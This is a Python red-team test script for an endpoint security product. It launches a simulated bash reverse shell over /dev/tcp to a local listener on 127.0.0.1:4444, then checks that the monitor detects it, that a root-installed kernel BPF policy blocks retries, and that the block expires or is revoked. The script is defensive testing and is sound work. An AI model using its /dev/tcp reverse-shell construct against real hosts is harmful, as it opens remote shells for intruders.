"""Red-team response run: detect a reverse shell, block its C2 target in the kernel, prove it.

Run INSIDE the target's console session (polkit needs the local seat) as the ordinary
owner, with the root sensor, broker and policy daemon running, the monitor writing
~/.linxai/security.sqlite and the local model reachable on 127.0.0.1:11434:

    LINXAI_TEST_REDTEAM=1 python3 -B scripts/redteam_block.py --out redteam-block.json

1. attacker: bash reverse shell to the C2 listener 127.0.0.1:4444 (must be a root-
   configured response target in /etc/linxai/response.json)
2. monitor: incident with kernel evidence
3. response: the block is built from the kernel evidence (the local model may only set
   its duration within 30-300 s; a slow or absent model never blocks containment)
4. owner: the root broker asks for the administrator password (polkit), installs the
   scoped BPF LSM policy and verifies it
5. attacker retries with bash and python: both must fail with EPERM; a near-miss port
   must still connect (scope)
6. the block expires in the kernel and the target connects again (or, with --revoke,
   the owner revokes it with a second password)
"""
import argparse
from dataclasses import asdict
import errno
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import time
from uuid import uuid4

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from scripts.accept_detection import incidents_since   # noqa: E402
from scripts.redteam_detect import listen               # noqa: E402

C2 = ("127.0.0.1", 4444)


def try_connect(port):
    try:
        with socket.create_connection((C2[0], port), timeout=3) as conn:
            conn.sendall(b"redteam\n")
        return "connected"
    except OSError as exc:
        return "EPERM (blocked)" if exc.errno == errno.EPERM else f"{type(exc).__name__}: {exc.strerror or exc}"


def bash_shell(port):
    # A failed `exec 3<>/dev/tcp/...` does not stop `bash -c` (it still exits 0), so the
    # outcome is read from bash's own error, and the script exits non-zero on failure.
    done = subprocess.run(["/bin/bash", "-c", f"exec 3<>/dev/tcp/{C2[0]}/{port} || exit 7; echo redteam >&3; exec 3>&-"],
                          capture_output=True, text=True, timeout=10, stdin=subprocess.DEVNULL)
    if "not permitted" in done.stderr:
        return "EPERM (blocked)"
    return "connected" if done.returncode == 0 and not done.stderr.strip() else done.stderr.strip()[:120]


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--state", default=str(Path.home() / ".linxai"))
    parser.add_argument("--out", default="redteam-block.json")
    parser.add_argument("--model", default="qwen2.5:1.5b")
    parser.add_argument("--duration", type=int, default=30, help="cap the test policy's lifetime (seconds)")
    parser.add_argument("--revoke", action="store_true", help="also revoke explicitly (second password) instead of waiting for expiry")
    args = parser.parse_args(argv)
    if os.environ.get("LINXAI_TEST_REDTEAM") != "1":
        print("PENDING: opt in with LINXAI_TEST_REDTEAM=1 on the prepared isolated target"); return 3
    if os.getuid() == 0:
        raise PermissionError("Run as the ordinary owner")
    from ai.local_planner import OllamaPlanner
    from operations.broker import BrokerClient
    from operations.registry import ActionRegistry
    store = Path(args.state) / "security.sqlite"
    record, steps = {"target": f"{C2[0]}:{C2[1]}"}, {}

    def step(name, ok, **facts):
        steps[name] = {"ok": bool(ok), **facts}
        print(("PASS " if ok else "FAIL ") + name, json.dumps(facts, default=str)[:300], flush=True)
        return ok

    c2, _ = listen(port=C2[1])
    near, _ = listen(port=C2[1] - 1)                      # 4443: an adjacent port the policy must not touch
    try:
        step("attacker reaches C2 before any response", try_connect(C2[1]) == "connected")
        attack_started = time.time()
        bash_shell(C2[1])
        incident = None
        deadline = time.monotonic() + 30
        while incident is None and time.monotonic() < deadline:
            incident = next((r for r in incidents_since(store, attack_started) if r["evidence"]["kind"] == "network_connect"
                             and r["evidence"]["target"].get("port") == C2[1] and r["evidence"].get("protocol") == "tcp"), None)
            time.sleep(0.5)
        if not step("monitor raised an incident for the reverse shell", incident, rule=(incident or {}).get("rule"),
                    seconds=round((incident or {}).get("created", attack_started) - attack_started, 2)):
            return 1
        event = incident["evidence"]
        from security.response import block_request          # the product's own proposal path
        request, origin = block_request(event, OllamaPlanner(args.model))
        request["parameters"]["duration"] = min(request["parameters"]["duration"], args.duration)   # short test policy
        policy_id = request["parameters"]["policy_id"]
        if not step("response proposed for exactly the evidenced target",
                    {"address": request["parameters"]["address"], "port": request["parameters"]["port"]} == event["target"],
                    origin=origin, duration=request["parameters"]["duration"]):
            return 1
        ActionRegistry(actor_uid=os.getuid()).prepare(request["action"], request["parameters"])
        print(">>> The administrator password is requested now (polkit) to install the kernel block.", flush=True)
        blocked = BrokerClient().run(request)
        record["block"] = asdict(blocked)
        if not step("root broker installed and verified the kernel policy", blocked.status == "succeeded" and blocked.verified,
                    status=blocked.status, reason=blocked.reason, seconds_from_attack=round(time.time() - attack_started, 1)):
            return 1
        step("attacker bash reverse shell retry is blocked", bash_shell(C2[1]) == "EPERM (blocked)", result=bash_shell(C2[1]))
        step("attacker python retry is blocked", try_connect(C2[1]) == "EPERM (blocked)", result=try_connect(C2[1]))
        step("adjacent port 4443 still connects (scope)", try_connect(C2[1] - 1) == "connected", result=try_connect(C2[1] - 1))
        if args.revoke:
            print(">>> The administrator password is requested again (polkit) to revoke the block.", flush=True)
            revoked = BrokerClient().run({"action": "response.policy.revoke", "parameters": {"policy_id": policy_id}})
            record["revoke"] = asdict(revoked)
            step("owner revoked the policy", revoked.status == "succeeded" and revoked.verified, status=revoked.status, reason=revoked.reason)
            step("target reachable again after revocation", try_connect(C2[1]) == "connected", result=try_connect(C2[1]))
        else:                                   # expiry is enforced in the kernel; no second password
            deadline = time.monotonic() + request["parameters"]["duration"] + 30
            while try_connect(C2[1]) != "connected" and time.monotonic() < deadline:
                time.sleep(2)
            step("block expired by itself in the kernel; target reachable again", try_connect(C2[1]) == "connected",
                 waited_s=round(time.time() - attack_started, 1))
    finally:
        c2.close(); near.close()
        record["steps"] = steps
        Path(args.out).write_text(json.dumps(record, indent=2, default=str) + "\n")
    passed = all(s["ok"] for s in steps.values())
    print(("PASS" if passed else "FAIL"), f"{sum(s['ok'] for s in steps.values())}/{len(steps)} steps")
    return 0 if passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
